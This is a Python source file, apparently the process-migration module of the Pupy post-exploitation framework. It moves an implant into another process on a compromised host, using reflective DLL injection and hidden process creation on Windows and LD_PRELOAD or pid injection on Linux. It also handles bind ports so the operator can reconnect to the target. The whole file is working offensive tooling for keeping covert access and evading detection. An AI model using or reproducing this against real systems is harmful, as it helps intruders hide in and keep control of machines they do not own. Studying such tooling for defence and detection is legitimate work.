# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

from modules.lib.windows.migrate import migrate as win_migrate
from modules.lib.linux.migrate import migrate as lin_migrate
from modules.lib.linux.migrate import ld_preload

__class_name__="MigrateModule"


@config(cat="manage", compat=["linux", "windows"])
class MigrateModule(PupyModule):
    """ Migrate pupy into another process using reflective DLL injection """
    max_clients=1
    dependencies={
        'windows': ['pupwinutils.processes']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="migrate", description=cls.__doc__)
        cls.arg_parser.add_argument('--no-wait', action='store_false', default=True,
                            help='Does not Hook exit thread function and wait until pupy exists (Linux)')

        group = cls.arg_parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-c', '--create', metavar='<exe_path>',
                            help='create a new process and inject into it')
        group.add_argument('-p', '--process', metavar='process_name',
                            help='search a process name and migrate into')
        group.add_argument('pid', nargs='?', type=int, help='pid')
        cls.arg_parser.add_argument(
            '-k', '--keep', action='store_true',
            help='migrate into the process but create a new session and keep the current pupy session running')
        cls.arg_parser.add_argument(
            '-t', '--timeout', type=int, default=30,
            help='time in seconds to wait for the connection')

    def run(self, args):
        if self.client.is_windows():
            isBindConnection=False #If current launcher uses a BIND connection, isBindConnection == True
            listeningPort=None #If current launcher uses a BIND connection, this port will be used on the target
            if self.client.desc['launcher'] == "bind":
                isBindConnection = True
                self.success("The current launcher uses a bind connection: you have to give a bind port")
                listeningPort = -1
                while listeningPort==-1:
                    try:
                        listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                    except Exception as e:
                        self.warning("You have to give me a valid port. Try again. ({})".format(e))
                self.success("After migration, the launcher will listen on the port {0} of the target".format(listeningPort))
            pid=None
            if args.create:
                self.success("Migrating to new windows process")
                p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
                pid=p.pid
                self.success("%s created with pid %s"%(args.create,pid))
            elif args.process:
                self.success("Looking for process %s"%args.process)
                pstree = self.client.remote('pupyps', 'pstree')
                root, tree, data = pstree()
                for k,v in data.iteritems():
                    proc=v['exe']
                    if not proc:
                        continue
                    if args.process.lower() in proc.lower():
                        pid=int(k)
                        self.success("Migrating to existing windows process {} identified with the pid {}".format(proc, pid))
                        break
            else:
                self.success("Migrating to existing windows process identified with the pid {0}".format(args.pid))
                pid=args.pid
            win_migrate(self, pid, args.keep, args.timeout, bindPort=listeningPort)
            if isBindConnection:
                listeningAddress = self.client.desc['address'].split(':')[0]
                listeningAddressPortForBind = "{0}:{1}".format(listeningAddress, listeningPort)
                self.success("You have to connect to the target manually on {0}: try 'connect --host {0}' in pupy shell".format(listeningAddressPortForBind))
        elif self.client.is_linux():
            if args.create:
                self.success("Migrating to new linux process using LD_PRELOAD")
                ld_preload(self, args.create, wait_thread=args.no_wait, keep=args.keep)
            else:
                self.success("Migrating to existing linux process")
                lin_migrate(self, args.pid, args.keep)
